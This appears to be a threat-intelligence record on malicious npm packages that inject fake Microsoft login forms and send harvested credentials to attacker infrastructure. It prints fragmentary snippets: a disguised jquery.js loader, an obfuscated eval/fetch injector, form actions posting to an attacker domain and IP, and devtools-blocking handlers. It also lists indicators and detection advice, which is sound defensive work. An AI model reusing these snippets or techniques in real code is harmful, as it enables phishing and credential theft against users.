package_info.package_versions: standforusz: 1.0.2, 1.0.3, 1.0.4, 3.0.7, 3.0.10; react-vuejs: 3.0.10, 10.21.30; tetusdgsudgs: 1.0.3, 1.0.4, 1.0.5; jqueryoffline: 1.0.2; vueofflinez: 1.0.1; jquerydownloadnew: 1.0.1
package_info.why_malicious: These npm packages were intentionally crafted to either serve as phishing kit infrastructure or implant credential harvesting scripts into applications. They target end users by mimicking legitimate libraries, using obfuscated code to inject fake Microsoft login forms, and exfiltrating credentials to attacker-controlled infrastructure. The packages are distributed via npm and are designed to be included in phishing email attachments or as supply chain implants in web applications.

execution_context.trigger: runtime (when a malicious HTML attachment is opened in the browser)
execution_context.file_location: jquery.js (from standforusz package, used in phishing email attachments)

malicious_snippets.code_snippet:
<script src="jquery.js"></script>
// jquery.js fetches jquery.min.js from CDN, which then fetches DEMO.txt and writes its content (fake login form) to the document.
malicious_snippets.code_behavior: At runtime, the code loads jquery.js, which fetches additional JavaScript and text files from a remote CDN, reads DEMO.txt containing a fake Microsoft login form, injects the form into the DOM, and enables credential exfiltration.

malice_analysis.why_suspicious: Fetching and dynamically injecting remote content to display a credential harvesting form is a well-known phishing technique, especially when the content mimics Microsoft login pages.
malice_analysis.violated_expectations: Legitimate packages should not inject fake login forms or exfiltrate user credentials, nor should they fetch and execute remote scripts without user consent.
malice_analysis.similar_legitimate_use: Dynamic content loading is common for legitimate widgets or analytics, but not for credential forms or authentication interfaces.
key_indicators: Dynamic fetching of remote scripts and text files
Injection of fake Microsoft login forms into the DOM
Credential exfiltration logic targeting attacker infrastructure
Use of misleading file names (e.g., jquery.js) to mimic legitimate libraries

execution_context.trigger: runtime (when user interacts with the fake login form)
execution_context.file_location: DEMO.txt (HTML/JS content loaded by malicious packages)

malicious_snippets.code_snippet: <form action="hxxp://ourwhite.brainleeches.xyz" method="POST"> ... </form> // or similar JS sending credentials to 137.184.153.238
malicious_snippets.code_behavior: At runtime, after the user enters credentials into the fake login form, the code collects the input and sends it via HTTP POST to attacker-controlled infrastructure, such as ourwhite.brainleeches.xyz or 137.184.153.238.

malice_analysis.why_suspicious: Credential exfiltration to non-Microsoft, attacker-controlled domains is a definitive indicator of phishing. The use of hardcoded external endpoints for sensitive data submission is highly suspicious.
malice_analysis.violated_expectations: Legitimate login forms should only submit credentials to trusted, official authentication endpoints, not to unknown or external domains/IPs.
malice_analysis.similar_legitimate_use: There is no legitimate use case for exfiltrating credentials to untrusted domains. Legitimate forms may post to corporate authentication servers, but never to unrelated IPs or domains.
key_indicators: Form action or JavaScript POST to attacker domain/IP
Use of obfuscated or hidden form fields to capture credentials
Hardcoded external endpoints for credential submission

execution_context.trigger: import-time/runtime (when package is bundled and executed in a web application)
execution_context.file_location: index.js (main entry in jqueryoffline, vueofflinez, etc.)

malicious_snippets.code_snippet: eval('var _0xb359=[...]; ... fetch(_0xb359[14]).then(...); ... document[_0xb359[11]](decodeHtml(...));') // obfuscated code that loads and injects phishing form
malicious_snippets.code_behavior: At import-time or runtime, the obfuscated code in index.js executes via eval, fetches remote resources containing phishing form HTML, decodes and injects the form into the application DOM, and enables credential theft.

malice_analysis.why_suspicious: Obfuscated code in a package's main entry point, especially when it uses eval and fetches/injects remote content, is a strong indicator of malicious intent. This behavior is designed to evade detection and facilitate credential theft.
malice_analysis.violated_expectations: Legitimate packages should not contain obfuscated, dynamically executed code that fetches and injects credential-stealing forms.
malice_analysis.similar_legitimate_use: Obfuscation may be used for DRM or licensing, but not for credential forms or dynamic injection of authentication interfaces.
key_indicators: Obfuscated JavaScript in main entry file
Use of eval for dynamic code execution
Fetching and injecting remote phishing forms
Decoding and writing HTML to the DOM at runtime

execution_context.trigger: runtime (user interaction with blurred document phishing page)

malicious_snippets.code_snippet: <form action="http://137.184.153.238" ...> ... </form> // or similar JS sending credentials
malicious_snippets.code_behavior: At runtime, the code overlays a blurred document with a fake Microsoft login form, collects user credentials, and exfiltrates them to an attacker-controlled IP address.

malice_analysis.why_suspicious: Overlaying a blurred document with a fake login form is a classic phishing tactic to trick users into entering credentials. The use of direct IP addresses for form actions further indicates malicious intent.
malice_analysis.violated_expectations: Legitimate document viewers do not prompt for credentials via overlaid forms, nor do they send data to untrusted IP addresses.
malice_analysis.similar_legitimate_use: No legitimate use case exists for credential exfiltration via overlaid forms on blurred documents.
key_indicators: Blurred background with overlaid fake login form
Form action or JavaScript POST to attacker IP
Attempts to disable right-click and developer tools to hinder analysis

malicious_snippets.code_behavior: At runtime, the code disables right-click context menu and blocks developer tools (e.g., F12 key) to prevent user inspection and hinder detection of the phishing activity.

malice_analysis.why_suspicious: Disabling browser features such as right-click and developer tools is a common anti-analysis and anti-forensics technique used by malicious actors to prevent users and analysts from inspecting the phishing page.
malice_analysis.violated_expectations: Legitimate applications do not block user inspection tools or restrict browser functionality in this manner.
malice_analysis.similar_legitimate_use: Some DRM-protected or exam software may use similar techniques, but this is rare and not appropriate for general web applications.
key_indicators: Blocking F12/dev tools access through onkeydown handlers
Obfuscation or hiding of anti-analysis logic in injected scripts

attack_chain.action: Malicious npm package is published and distributed, either as phishing kit infrastructure or as a supply chain implant in developer applications.
attack_chain.leads_to: Malicious files are included in phishing emails or embedded in web applications.

attack_chain.action: Victim opens a malicious HTML attachment or uses an application containing the malicious package, triggering execution of the embedded JavaScript.
attack_chain.leads_to: Malicious JavaScript is executed in the victim's browser or application environment.

attack_chain.action: Malicious JavaScript fetches and injects a fake Microsoft login form into the DOM, often overlaying a blurred document to prompt for credentials.
attack_chain.leads_to: Victim is presented with a convincing fake login prompt.

attack_chain.action: Victim enters credentials into the fake form, which are then collected and exfiltrated to attacker-controlled infrastructure.
attack_chain.leads_to: Credentials are sent to external domains or IPs controlled by the attacker.

attack_chain.action: Anti-analysis code disables right-click and developer tools to hinder user inspection and detection of the phishing activity.
attack_chain.leads_to: Reduces likelihood of user or analyst discovering the phishing activity or analyzing the malicious code.

behavioral_signatures: Obfuscated JavaScript in npm package entry points (e.g., use of eval and encoded variable names)
Dynamic fetching and injection of remote HTML/JS content at runtime
Creation and injection of fake login forms mimicking Microsoft 365 or other authentication portals
Credential exfiltration via HTTP POST to non-corporate domains or hardcoded IP addresses
Disabling of browser right-click context menu and developer tools through JavaScript event handlers
file_indicators: Presence of DEMO.txt, index.html, or index.js files in npm packages
Obfuscated or hex-encoded JavaScript in main entry files (e.g., index.js)
Form actions or JavaScript POST requests pointing to ourwhite.brainleeches.xyz or 137.184.153.238
Files named to mimic legitimate libraries (e.g., jquery.js) but containing malicious logic
network_indicators: HTTP POST requests containing credential data to non-corporate endpoints
detection_knowledge.how_to_detect: Monitor for npm packages that contain obfuscated JavaScript, especially in main entry points or files named after popular libraries (e.g., jquery.js). Flag packages containing DEMO.txt, index.html, or index.js files with embedded credential forms. Detect network traffic to known malicious domains or IPs (ourwhite.brainleeches.xyz, 137.184.153.238) and monitor for HTTP POST requests with credential data to these endpoints. Use static and dynamic analysis to identify code that disables browser inspection tools or dynamically injects login forms. Correlate file, behavioral, and network indicators to identify and block malicious packages before they are executed.
